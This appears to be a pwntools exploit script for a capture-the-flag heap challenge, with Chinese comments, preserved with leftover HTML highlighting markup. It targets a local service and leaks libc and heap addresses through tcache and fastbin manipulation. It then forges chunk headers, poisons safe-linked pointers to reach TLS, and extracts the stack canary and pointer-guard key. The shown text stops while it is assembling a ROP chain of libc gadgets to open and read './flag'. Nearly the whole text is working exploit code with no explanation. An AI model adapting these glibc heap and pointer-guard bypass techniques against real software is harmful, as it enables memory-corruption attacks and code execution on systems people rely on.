context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


<span class="token comment"># file_name = &quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">49979</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+34&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">&quot;b *main+34&quot;</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;输入请继续&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add_with_no_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;-1&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk data: &quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\\n添加index为:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">的chunk\\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\\n删除index为</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">的chunk\\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res
<span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;114514&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span>  <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;非预期数据&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data
<span class="token keyword">def</span> <span class="token function">rol</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 模拟 64 位无符号整数</span>
    mask <span class="token operator">=</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">0x11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>value <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask
<span class="token keyword">def</span> <span class="token function">remove_high_digits</span><span class="token punctuation">(</span>hex_num<span class="token punctuation">,</span> desired_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>hex_num<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 将十六进制数字转换为字符串，并去掉开头的&quot;0x&quot;</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> desired_length<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 如果字符串长度小于等于所需长度，直接返回</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token operator">-</span>desired_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 否则，返回去掉最高位后的字符串</span>
<span class="token comment"># 泄露出chunk</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token comment"># data = view(5)</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2207216</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token comment"># 泄露heap</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
<span class="token comment"># print(&quot;base_libc&quot;,hex(base_libc))</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># debug()</span>
<span class="token comment">#  0x5633731e9da0</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">7856</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">719</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment">#0x3b0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span>
fd <span class="token operator">=</span> <span class="token number">0x100</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0xb20</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># index:10</span>
<span class="token comment"># 构造fastbin</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 0x5600edb1db20-0x5600edb1d000</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>

tls <span class="token operator">=</span> base_libc <span class="token operator">-</span><span class="token number">10432</span>
xor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">12</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>tls<span class="token operator">^</span>xor<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>tls<span class="token operator">^</span>xor<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>tls<span class="token operator">^</span>xor<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>base_libc<span class="token operator">-</span><span class="token number">0x28c0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_libc<span class="token operator">-</span><span class="token number">0x1ea0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token comment"># 0x7fe867b61160</span>
data <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># print(data)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
key <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">759</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment"># fd</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42050</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># index 8</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
write <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x114870</span><span class="token punctuation">)</span>
open64 <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x1144E0</span>  <span class="token punctuation">)</span>
read <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x1147D0</span><span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x2a3e5</span><span class="token punctuation">)</span>
pop_rsi <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x2be51</span><span class="token punctuation">)</span>
pop_rdx_r12 <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x11f2e7</span><span class="token punctuation">)</span>
pop_rsp <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x35732</span><span class="token punctuation">)</span>
leave <span class="token operator">=</span> base_libc<span class="token operator">+</span><span class="token number">0x133BEA</span>
flag <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0x1398</span>
r_s <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0x1390</span>
buff <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0xf40</span>
sendline <span class="token operator">=</span> base_libc<span class="token operator">+</span><span class="token number">0x119170</span>
addr <span class="token operator">=</span> rol<span class="token punctuation">(</span>leave<span class="token operator">^</span>key<span class="token punctuation">)</span>
pop_rcx <span class="token operator">=</span>base_libc <span class="token operator">+</span><span class="token number">0x3d1ee</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;r\\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b&quot;./flag\\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\\x00&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
